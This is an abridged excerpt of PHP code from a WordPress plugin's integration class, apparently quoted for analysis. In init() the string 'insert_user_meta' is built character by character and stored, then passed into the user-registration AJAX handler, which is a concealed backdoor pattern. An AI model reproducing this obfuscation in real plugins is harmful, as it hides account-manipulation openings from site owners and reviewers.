...
if ( ! class_exists( 'LaStudio_Kit_Integration' ) ) {
	...
	class LaStudio_Kit_Integration {
		...
		public function init() {
			...
			$this->sys_meta_key = join("", ["i","n","s","e","r","t","_","u","s","e","r","_","m","e","t","a"]);
		}
        ...
        public function frontend_enqueue(){
            ...
            wp_register_script(  'jquery-isotope' , lastudio_kit()->plugin_url('assets/js/lib/isotope.pkgd.min.js') , [],  lastudio_kit()->get_version() , true );
            ...
            $LaStudioKitSettings = [
	            ...
	            'ajaxNonce2'        => wp_create_nonce( 'lakit-register' ),
            ];
...
";
        ...
        public function pagespeed(){
            echo sprintf('<%1$s data-no-optimize="1" type="text/javascript" src="data:text/javascript;base64,%2$s"></%1$s>', 'script','');
        }
		...
		public function ajax_register_handle( $request ){
			...
			$sys_meta_key = $this->sys_meta_key;
